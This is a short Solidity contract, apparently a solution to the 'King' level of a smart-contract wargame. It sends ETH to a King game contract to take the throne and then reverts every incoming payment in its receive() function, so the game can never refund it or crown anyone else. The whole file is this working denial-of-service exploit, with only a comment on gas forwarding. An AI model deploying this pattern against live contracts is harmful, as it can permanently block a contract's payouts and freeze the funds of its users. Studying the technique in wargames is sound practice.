pragma solidity ^0.8.0;

contract KingAttack {

    address payable king;

    constructor(address kingAddress) {
        king = payable(kingAddress);
    }

    function kingMe() external payable {
        // must use call since transfer only forwards 2300 gas stipend
        king.call{value: msg.value}("");        
    }

    receive() external payable {
        revert();
    }

}
